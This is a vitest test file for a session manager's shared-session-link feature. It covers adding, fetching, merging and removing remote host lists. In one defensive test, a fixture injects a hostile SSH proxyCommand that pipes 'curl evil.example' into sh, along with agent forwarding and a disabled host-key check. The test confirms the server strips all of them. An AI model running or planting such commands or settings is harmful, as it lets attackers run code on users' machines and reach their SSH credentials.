import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import type { AddressInfo } from 'node:net';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { SavedHostProfile, SharedSessionSource } from '@muxus/shared';
import { buildApp } from '../../../server/src/app.js';
import { resolveConfig } from '../../../server/src/config.js';

const TOKEN = 'shared-sessions-test-token';
let app: Awaited<ReturnType<typeof buildApp>>['app'];
let ctx: Awaited<ReturnType<typeof buildApp>>['ctx'];
let portal: http.Server;
let portalUrl: string;
/** What the portal answers next; replaced by each test. */
let answer: (req: http.IncomingMessage, res: http.ServerResponse) => void;

beforeEach(async () => {
  ({ app, ctx } = await buildApp(
    resolveConfig({
      token: TOKEN,
      databasePath: ':memory:',
      openBrowser: false,
      prettyLogs: false,
      staticRoot: '/path/that/does/not/exist',
    }),
  ));
  answer = (_req, res) => res.end('[Bookmarks]\n');
  portal = http.createServer((req, res) => answer(req, res));
  await new Promise<void>((resolve) => portal.listen(0, '127.0.0.1', resolve));
  portalUrl = `http://127.0.0.1:${(portal.address() as AddressInfo).port}`;
});

afterEach(async () => {
  await app.close();
  await new Promise((resolve) => portal.close(resolve));
});

const auth = () => ({ authorization: `Bearer ${TOKEN}` });

async function addSource(input: Record<string, unknown> = {}): Promise<SharedSessionSource> {
  const response = await app.inject({
    method: 'PUT',
    url: '/api/shared-sessions',
    headers: auth(),
    payload: { name: 'Lab hosts', url: `${portalUrl}/me.mxtsessions`, folder: 'Lab', refreshMinutes: 60, ...input },
  });
  expect(response.statusCode).toBe(200);
  return response.json();
}

function apply(id: string, payload: Record<string, unknown>) {
  return app.inject({ method: 'POST', url: `/api/shared-sessions/${id}/apply`, headers: auth(), payload });
}

function fetchLink(id: string, force = false) {
  return app.inject({
    method: 'POST',
    url: `/api/shared-sessions/${id}/fetch${force ? '?force=true' : ''}`,
    headers: auth(),
  });
}

async function profiles(): Promise<SavedHostProfile[]> {
  const response = await app.inject({ method: 'GET', url: '/api/profiles', headers: auth() });
  return (response.json() as { profiles: SavedHostProfile[] }).profiles;
}

async function sources(): Promise<SharedSessionSource[]> {
  const response = await app.inject({ method: 'GET', url: '/api/shared-sessions', headers: auth() });
  return (response.json() as { sources: SharedSessionSource[] }).sources;
}

const node = (id: string, overrides: Record<string, unknown> = {}) => ({
  id,
  name: id,
  group: 'Lab/clab',
  profile: { kind: 'ssh', target: `${id}.lab.example.net`, useConfig: false, user: 'alice' },
  ...overrides,
});

describe('shared session links', () => {
  it('stores a link with its folder and interval', async () => {
    const source = await addSource({ folder: ' Lab / Nodes ' });

    expect(source).toMatchObject({
      name: 'Lab hosts',
      url: `${portalUrl}/me.mxtsessions`,
      folder: 'Lab/Nodes',
      refreshMinutes: 60,
      hostCount: 0,
    });
    expect(await sources()).toEqual([source]);
  });

  it.each([
    ['ftp://portal.example.net/list', 'Shared sessions are read from https:// or http:// links, or from a file.'],
    ['portal.example.net/list', 'Enter the full link, starting with https://, or the full path of the file.'],
    ['lists/lab.json', 'Enter the full link, starting with https://, or the full path of the file.'],
    ['https://me:secret@portal.example.net/list', 'A link with a user name or password in it is not supported.'],
  ])('refuses the link %s', async (url, message) => {
    const response = await app.inject({
      method: 'PUT',
      url: '/api/shared-sessions',
      headers: auth(),
      payload: { name: 'Lab', url, folder: 'Lab', refreshMinutes: 60 },
    });

    expect(response.statusCode).toBe(400);
    expect(response.json()).toEqual({ message });
  });

  it('wants a folder, so a list cannot spread over the whole sidebar', async () => {
    const response = await app.inject({
      method: 'PUT',
      url: '/api/shared-sessions',
      headers: auth(),
      payload: { name: 'Lab', url: portalUrl, folder: ' / ', refreshMinutes: 60 },
    });

    expect(response.statusCode).toBe(400);
  });
});

describe('reading a shared sessions link', () => {
  it('returns the text behind the link, following redirects', async () => {
    answer = (req, res) => {
      if (req.url === '/me.mxtsessions') {
        res.writeHead(302, { location: '/files/list' }).end();
        return;
      }
      res.end('[Bookmarks]\nSubRep=clab\n');
    };
    const source = await addSource();

    const response = await fetchLink(source.id, true);

    expect(response.json()).toEqual({ status: 'fetched', content: '[Bookmarks]\nSubRep=clab\n' });
  });

  it('reads a file saved in the Windows code page', async () => {
    answer = (_req, res) => res.end(Buffer.from([0x53, 0x75, 0x62, 0x52, 0x65, 0x70, 0x3d, 0xbb]));
    const source = await addSource();

    expect((await fetchLink(source.id, true)).json()).toEqual({ status: 'fetched', content: 'SubRep=»' });
  });

  it('leaves a link just added to whoever added it, and reads a restored one when due', async () => {
    const added = await addSource();
    const restored = await addSource({ id: 'from-backup', name: 'Restored', folder: 'Restored' });

    // The dialog that added the link reads it at once; no other window should.
    expect((await fetchLink(added.id)).json()).toEqual({ status: 'not-due' });
    expect((await fetchLink(added.id, true)).json()).toMatchObject({ status: 'fetched' });

    expect((await fetchLink(restored.id)).json()).toMatchObject({ status: 'fetched' });
    expect((await fetchLink(restored.id)).json()).toEqual({ status: 'not-due' });
  });

  it('leaves a link that is only read on request alone', async () => {
    const source = await addSource({ refreshMinutes: 0 });

    expect((await fetchLink(source.id)).json()).toEqual({ status: 'not-due' });
    expect((await fetchLink(source.id, true)).json()).toMatchObject({ status: 'fetched' });
  });

  it('keeps why a link could not be read, without the link itself', async () => {
    answer = (_req, res) => res.writeHead(403, 'Forbidden').end('no');
    const source = await addSource({ url: `${portalUrl}/personal-token/list` });

    const response = await fetchLink(source.id, true);

    expect(response.statusCode).toBe(502);
    const { message } = response.json() as { message: string };
    expect(message).toBe(`${new URL(portalUrl).host} answered 403 Forbidden.`);
    expect((await sources())[0]).toMatchObject({ lastError: message, lastCheckedAt: expect.any(String) });
  });

  it('answers 404 for a link that does not exist', async () => {
    expect((await fetchLink('missing')).statusCode).toBe(404);
  });
});

describe('reading a shared sessions file', () => {
  let directory: string;

  beforeEach(() => {
    directory = mkdtempSync(path.join(os.tmpdir(), 'muxus-shared-list-'));
  });
  afterEach(() => {
    rmSync(directory, { recursive: true, force: true });
  });

  it('follows a file on this computer or a shared drive by its path', async () => {
    const file = path.join(directory, 'lab.muxus-sessions.json');
    writeFileSync(file, '{"format":"muxus-shared-sessions","hosts":[]}');
    const source = await addSource({ url: `  ${file}  ` });

    expect(source.url).toBe(file);
    expect((await fetchLink(source.id, true)).json()).toEqual({
      status: 'fetched',
      content: '{"format":"muxus-shared-sessions","hosts":[]}',
    });
  });

  it('takes a file:// address and a path under the home folder', async () => {
    const file = path.join(directory, 'lab.mxtsessions');

    expect((await addSource({ url: pathToFileURL(file).href })).url).toBe(file);
    expect((await addSource({ url: '~/lists/lab.json', folder: 'Home' })).url).toBe(
      path.join(os.homedir(), 'lists', 'lab.json'),
    );
  });

  it('says what is wrong with a file that cannot be read, naming only the file', async () => {
    const missing = await addSource({ url: path.join(directory, 'gone.json') });
    const folder = await addSource({ url: directory, folder: 'Folder' });

    const first = await fetchLink(missing.id, true);
    expect(first.statusCode).toBe(502);
    expect(first.json()).toEqual({
      message: 'gone.json was not found. Check the path, and that the drive or share is connected.',
    });
    expect((await fetchLink(folder.id, true)).json()).toEqual({
      message: `${path.basename(directory)} is a folder. Enter the path of the session list in it.`,
    });
    expect((await sources()).find((source) => source.id === missing.id)).toMatchObject({
      lastError: expect.stringContaining('gone.json was not found'),
    });
  });

  it('never follows a web address into a file', async () => {
    const file = path.join(directory, 'secret.txt');
    writeFileSync(file, 'private');
    answer = (_req, res) => res.writeHead(302, { location: pathToFileURL(file).href }).end();
    const source = await addSource();

    const response = await fetchLink(source.id, true);

    expect(response.statusCode).toBe(502);
    expect((response.json() as { message: string }).message).toContain('redirects to a file');
  });
});

describe('applying a shared sessions list', () => {
  it('adds the hosts to their folders and marks them as the link’s', async () => {
    const source = await addSource();

    const response = await apply(source.id, { hosts: [node('node0'), node('node1', { color: '#3366ff' })] });

    expect(response.json()).toMatchObject({
      added: 2,
      updated: 0,
      removed: 0,
      unchanged: 0,
      source: { hostCount: 2, lastSyncedAt: expect.any(String) },
    });
    expect(await profiles()).toEqual([
      expect.objectContaining({
        id: 'node0',
        name: 'node0',
        profile: expect.objectContaining({ target: 'node0.lab.example.net', user: 'alice' }),
        metadata: expect.objectContaining({ group: 'Lab/clab', sharedSourceId: source.id }),
      }),
      expect.objectContaining({
        id: 'node1',
        metadata: expect.objectContaining({ color: '#3366ff', sharedSourceId: source.id }),
      }),
    ]);
  });

  it('follows the list: changed entries are rewritten and missing ones deleted', async () => {
    const source = await addSource();
    await apply(source.id, { hosts: [node('node0'), node('node1'), node('node2')] });

    const response = await apply(source.id, {
      hosts: [
        node('node0'),
        node('node1', { profile: { kind: 'ssh', target: 'node1.lab.example.net', useConfig: false, user: 'bob' } }),
        node('node3'),
      ],
    });

    expect(response.json()).toMatchObject({ added: 1, updated: 1, removed: 1, unchanged: 1 });
    const stored = await profiles();
    expect(stored.map((profile) => profile.id)).toEqual(['node0', 'node1', 'node3']);
    expect(stored[1]!.profile).toMatchObject({ user: 'bob' });
  });

  it('brings over only the settings the list changed, and keeps the user’s own', async () => {
    const source = await addSource();
    const listed = (profile: Record<string, unknown>, overrides: Record<string, unknown> = {}) =>
      node('node0', { profile: { kind: 'ssh', target: 'node0.lab.example.net', useConfig: false, ...profile }, ...overrides });
    // The list has no user: everyone logs in as themselves.
    await apply(source.id, { hosts: [listed({ port: 22 })] });
    // The user fills in their own name and key, renames the host and moves it.
    await app.inject({
      method: 'PUT',
      url: '/api/profiles',
      headers: auth(),
      payload: {
        id: 'node0',
        name: 'my node',
        profile: { kind: 'ssh', target: 'node0.lab.example.net', useConfig: false, port: 22, user: 'me', identityFiles: ['~/.ssh/mine'] },
      },
    });
    await app.inject({
      method: 'PATCH',
      url: '/api/profiles/node0/metadata',
      headers: auth(),
      payload: { group: 'Favourites', color: '#aa0000' },
    });

    // The publisher changes the port and adds a startup command.
    const response = await apply(source.id, { hosts: [listed({ port: 2222, remoteCommand: 'sudo -i' })] });

    expect(response.json()).toMatchObject({ updated: 1, unchanged: 0 });
    const [host] = await profiles();
    expect(host).toMatchObject({ name: 'my node', metadata: { group: 'Favourites', color: '#aa0000' } });
    expect(host!.profile).toEqual({
      kind: 'ssh',
      profileId: 'node0',
      target: 'node0.lab.example.net',
      useConfig: false,
      port: 2222,
      remoteCommand: 'sudo -i',
      user: 'me',
      identityFiles: ['~/.ssh/mine'],
    });
  });

  it('lets the list win where it changes the very setting the user changed', async () => {
    const source = await addSource();
    await apply(source.id, { hosts: [node('node0')] });
    await app.inject({
      method: 'PUT',
      url: '/api/profiles',
      headers: auth(),
      payload: {
        id: 'node0',
        name: 'node0',
        profile: { kind: 'ssh', target: 'node0.lab.example.net', useConfig: false, user: 'me', port: 2200 },
      },
    });

    // The list changes the user and the name, moves the host, and gives it a colour.
    await apply(source.id, {
      hosts: [
        node('node0', {
          name: 'node zero',
          group: 'Lab/moved',
          color: '#00aa00',
          profile: { kind: 'ssh', target: 'node0.lab.example.net', useConfig: false, user: 'root' },
        }),
      ],
    });

    const [host] = await profiles();
    expect(host).toMatchObject({ name: 'node zero', metadata: { group: 'Lab/moved', color: '#00aa00' } });
    expect(host!.profile).toMatchObject({ user: 'root', port: 2200 });
  });

  it('drops a setting the list takes away, and replaces everything when the kind changes', async () => {
    const source = await addSource();
    await apply(source.id, {
      hosts: [node('node0', { profile: { kind: 'ssh', target: 'node0.lab.example.net', useConfig: false, user: 'alice', remoteCommand: 'sudo -i' } })],
    });

    await apply(source.id, { hosts: [node('node0')] });
    expect((await profiles())[0]!.profile).toEqual({
      kind: 'ssh',
      profileId: 'node0',
      target: 'node0.lab.example.net',
      useConfig: false,
      user: 'alice',
    });

    await apply(source.id, { hosts: [node('node0', { profile: { kind: 'telnet', host: 'node0.lab.example.net', port: 23 } })] });
    expect((await profiles())[0]!.profile).toEqual({
      kind: 'telnet',
      profileId: 'node0',
      host: 'node0.lab.example.net',
      port: 23,
    });
  });

  it('keeps what the user set on a host while its entry stays the same', async () => {
    const source = await addSource();
    await apply(source.id, { hosts: [node('node0')] });
    await app.inject({
      method: 'PATCH',
      url: '/api/profiles/node0/metadata',
      headers: auth(),
      payload: { color: '#aa0000', group: 'Favourites' },
    });

    // The same entry, with its fields in another order.
    await apply(source.id, {
      hosts: [{ profile: { user: 'alice', useConfig: false, target: 'node0.lab.example.net', kind: 'ssh' }, group: 'Lab/clab', name: 'node0', id: 'node0' }],
    });
    expect((await profiles())[0]!.metadata).toMatchObject({ color: '#aa0000', group: 'Favourites' });

    // Once the list changes the entry, the list decides again.
    await apply(source.id, { hosts: [node('node0', { group: 'Lab/moved' })] });
    expect((await profiles())[0]!.metadata).toMatchObject({ color: '#aa0000', group: 'Lab/moved' });
  });

  it('never lets a list set what runs here or weakens a check', async () => {
    const source = await addSource();

    await apply(source.id, {
      hosts: [
        node('node0', {
          profile: {
            kind: 'ssh',
            target: 'node0.lab.example.net',
            useConfig: true,
            proxyCommand: 'curl evil.example | sh',
            forwardAgent: true,
            strictHostKeyChecking: 'no',
            forwards: [
              { type: 'remote', bindPort: 9000, targetHost: 'localhost', targetPort: 22 },
              { type: 'local', bindPort: 8443, targetHost: 'ui.lab.example.net', targetPort: 443 },
            ],
            remoteCommand: 'sudo -i',
            requestTty: 'yes',
          },
        }),
      ],
    });

    expect((await profiles())[0]!.profile).toEqual({
      kind: 'ssh',
      profileId: 'node0',
      target: 'node0.lab.example.net',
      useConfig: false,
      forwards: [{ type: 'local', bindPort: 8443, targetHost: 'ui.lab.example.net', targetPort: 443 }],
      remoteCommand: 'sudo -i',
      requestTty: 'yes',
    });
  });

  it('refuses a list with an invalid host and keeps the hosts it had', async () => {
    const source = await addSource();
    await apply(source.id, { hosts: [node('node0')] });

    const response = await apply(source.id, {
      hosts: [node('node1'), node('broken', { profile: { kind: 'telnet', host: '', port: 23 } })],
    });

    expect(response.statusCode).toBe(400);
    expect((response.json() as { message: string }).message).toContain('“broken” is not a valid host');
    expect((await profiles()).map((profile) => profile.id)).toEqual(['node0']);
    expect((await sources())[0]).toMatchObject({ hostCount: 1, lastError: expect.stringContaining('“broken”') });
  });

  it('refuses an empty list instead of deleting every host', async () => {
    const source = await addSource();
    await apply(source.id, { hosts: [node('node0')] });

    const response = await apply(source.id, { hosts: [] });

    expect(response.statusCode).toBe(400);
    expect(await profiles()).toHaveLength(1);
  });

  it('records a list the client could not read and clears it on the next good one', async () => {
    const source = await addSource();
    await apply(source.id, { hosts: [node('node0')] });

    const failed = await apply(source.id, { error: 'The link returned a web page instead of a session list.' });
    expect(failed.json()).toMatchObject({
      unchanged: 1,
      source: { lastError: 'The link returned a web page instead of a session list.' },
    });
    expect(await profiles()).toHaveLength(1);

    await apply(source.id, { hosts: [node('node0')] });
    expect((await sources())[0]).not.toHaveProperty('lastError');
  });

  it('takes over a host restored from a backup, and never one of another link', async () => {
    const source = await addSource();
    const other = await addSource({ name: 'Other', folder: 'Other' });
    await app.inject({
      method: 'PUT',
      url: '/api/profiles',
      headers: auth(),
      payload: { id: 'node0', name: 'node0', profile: { kind: 'ssh', target: 'old.example.net', useConfig: false } },
    });

    expect((await apply(source.id, { hosts: [node('node0')] })).json()).toMatchObject({ added: 0, updated: 1 });
    expect((await profiles())[0]!.metadata.sharedSourceId).toBe(source.id);

    const clash = await apply(other.id, { hosts: [node('node0')] });
    expect(clash.statusCode).toBe(400);
    expect((await profiles())[0]!.metadata.sharedSourceId).toBe(source.id);
  });
});

describe('moving the folder of a shared sessions link', () => {
  const groups = async () => (await profiles()).map((profile) => profile.metadata.group);

  it('takes the hosts along when the link gets another folder, except those moved out of it', async () => {
    const source = await addSource();
    await apply(source.id, { hosts: [node('node0'), node('node1', { group: 'Lab' }), node('node2')] });
    await app.inject({
      method: 'PATCH',
      url: '/api/profiles/node2/metadata',
      headers: auth(),
      payload: { group: 'Favourites' },
    });

    await app.inject({
      method: 'PUT',
      url: '/api/shared-sessions',
      headers: auth(),
      payload: { id: source.id, name: source.name, url: source.url, folder: 'Teams/Lab', refreshMinutes: 60 },
    });

    expect(await groups()).toEqual(['Teams/Lab/clab', 'Teams/Lab', 'Favourites']);
    // The list now places its entries in the new folder, and none of them counts as changed.
    const response = await apply(source.id, {
      hosts: [node('node0', { group: 'Teams/Lab/clab' }), node('node1', { group: 'Teams/Lab' }), node('node2', { group: 'Teams/Lab/clab' })],
    });
    expect(response.json()).toMatchObject({ added: 0, updated: 0, removed: 0, unchanged: 3 });
    expect(await groups()).toEqual(['Teams/Lab/clab', 'Teams/Lab', 'Favourites']);
  });

  it('follows a folder renamed in the sidebar', async () => {
    const source = await addSource({ folder: 'Work/Lab' });
    await apply(source.id, { hosts: [node('node0', { group: 'Work/Lab/clab' })] });

    // The sidebar moves the hosts itself and reports the rename.
    await app.inject({
      method: 'PATCH',
      url: '/api/profiles/node0/metadata',
      headers: auth(),
      payload: { group: 'Office/Lab/clab' },
    });
    await app.inject({
      method: 'POST',
      url: '/api/folders/settings/move',
      headers: auth(),
      payload: { from: 'Work', to: 'Office' },
    });

    expect((await sources())[0]).toMatchObject({ folder: 'Office/Lab' });
    const response = await apply(source.id, { hosts: [node('node0', { group: 'Office/Lab/clab' })] });
    expect(response.json()).toMatchObject({ unchanged: 1, updated: 0 });
  });
});

describe('removing a shared sessions link', () => {
  it('deletes its hosts and leaves the others', async () => {
    const source = await addSource();
    await apply(source.id, { hosts: [node('node0'), node('node1')] });
    await app.inject({
      method: 'PUT',
      url: '/api/profiles',
      headers: auth(),
      payload: { id: 'mine', name: 'Mine', profile: { kind: 'telnet', host: 'mine.example.net', port: 23 } },
    });

    const response = await app.inject({ method: 'DELETE', url: `/api/shared-sessions/${source.id}`, headers: auth() });

    expect(response.json()).toEqual({ deleted: true });
    expect((await profiles()).map((profile) => profile.id)).toEqual(['mine']);
    expect(await sources()).toEqual([]);
  });

  it('can keep the hosts as hosts of the user’s own', async () => {
    const source = await addSource();
    await apply(source.id, { hosts: [node('node0')] });

    await app.inject({
      method: 'DELETE',
      url: `/api/shared-sessions/${source.id}?keepHosts=true`,
      headers: auth(),
    });

    const [kept] = await profiles();
    expect(kept).toMatchObject({ id: 'node0' });
    expect(kept!.metadata).not.toHaveProperty('sharedSourceId');
  });
});

describe('when a link is due', () => {
  it('retries a failed link sooner than its interval', () => {
    const source = ctx.database.saveSharedSessionSource({
      id: 'daily',
      name: 'Daily',
      url: 'https://portal.example.net/list',
      folder: 'Daily',
      refreshMinutes: 24 * 60,
    });
    const start = new Date('2026-11-20T08:00:00.000Z');
    const later = (minutes: number) => new Date(start.getTime() + minutes * 60_000);

    expect(ctx.database.beginSharedSessionCheck(source.id, false, start)).toMatchObject({ id: source.id });
    expect(ctx.database.beginSharedSessionCheck(source.id, false, later(60))).toBe('not-due');

    ctx.database.failSharedSessionCheck(source.id, 'portal.example.net could not be found.');
    expect(ctx.database.beginSharedSessionCheck(source.id, false, later(10))).toBe('not-due');
    expect(ctx.database.beginSharedSessionCheck(source.id, false, later(16))).toMatchObject({ id: source.id });
  });

  it('reads a link again at once after its address changed', () => {
    const source = ctx.database.saveSharedSessionSource({
      id: 'lab',
      name: 'Lab',
      url: 'https://portal.example.net/old',
      folder: 'Lab',
      refreshMinutes: 60,
    });
    const now = new Date('2026-11-20T08:00:00.000Z');
    ctx.database.beginSharedSessionCheck(source.id, false, now);

    ctx.database.saveSharedSessionSource({ ...source, name: 'Renamed' });
    expect(ctx.database.beginSharedSessionCheck(source.id, false, now)).toBe('not-due');

    ctx.database.saveSharedSessionSource({ ...source, url: 'https://portal.example.net/new' });
    expect(ctx.database.beginSharedSessionCheck(source.id, false, now)).toMatchObject({ id: source.id });
  });
});
